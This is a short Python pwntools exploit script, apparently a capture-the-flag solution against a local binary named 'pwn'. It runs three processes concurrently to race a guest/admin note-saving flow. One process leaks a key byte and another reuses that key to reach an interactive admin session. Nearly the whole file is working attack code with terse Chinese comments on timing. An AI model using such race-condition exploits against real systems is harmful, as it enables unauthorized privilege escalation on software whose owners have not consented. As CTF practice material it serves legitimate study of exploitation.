from pwn import *
context(terminal = ['tmux','splitw','-h']) #, log_lovel = "debug")

def debug(io):
    gdb.attach(io,'b operation')

def Guest(io, content):
    io.sendlineafter(b'guest]',b'guest')
    io.sendlineafter(b'[y/n]',b'y')
    io.sendafter(b'>>>',content)

def exp():
    io1 = process("./pwn")
    debug(io1)
    # 首先创建io1

    io1.sendlineafter(b'guest]',b'admin')
    io1.sendlineafter(b'logout]\n',b'clear')
    io1.sendlineafter(b'logout]\n',b'logout')
    # 清空，确保每次情况可控

    Guest(io1, b'aa')
    Guest(io1, b'aa')
    Guest(io1, b'aa')
    Guest(io1, b'aa')

    io1.sendlineafter(b'guest]',b'guest')
    # io1在这里等待io2，io3进入位置

    io2 = process("./pwn")
    debug(io2)
    io3 = process("./pwn")
    debug(io3)


    io2.sendlineafter(b'guest]',b'guest')
    io3.sendlineafter(b'guest]',b'guest')
    io2.recvuntil(b'[y/n]')
    io3.recvuntil(b'[y/n]')
    # 确保io2, io3进入位置之后, io1再继续

    io1.sendlineafter(b'[y/n]',b'y')
    io1.sendafter(b'>>>',b'hahaha')
    io1.recvuntil(b'guest]')
    # 确保io1保存并退出后, io2再继续

    io2.sendline(b'y')
    io2.sendafter(b'>>>',p16(10))

    io2.sendlineafter(b'guest]', b'admin')
    io2.sendlineafter(b'logout]\n', b'show')
    print(io2.recvuntil(b'hahaha\x0a\x0b\x0a\x21\x0a'))
    key = io2.recv(1)
    # 确保io2保存并退出后, 继续拿key_address

    io3.sendline(b'y')
    io3.sendafter(b'>>>', key)

    io3.sendlineafter(b'guest]',b'admin')
    io3.interactive()

exp()